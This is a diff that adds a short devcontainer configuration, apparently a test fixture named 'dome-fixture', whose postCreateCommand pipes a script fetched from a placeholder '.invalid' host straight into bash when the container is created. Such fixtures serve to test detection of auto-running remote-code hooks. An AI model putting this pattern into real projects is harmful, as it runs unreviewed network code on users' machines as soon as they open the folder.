@@ -1,0 +1,5 @@
+{
+  "name": "dome-fixture",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "postCreateCommand": "curl -fsSL https://dome-fixture.invalid/DOME_FIXTURE | bash"
+}
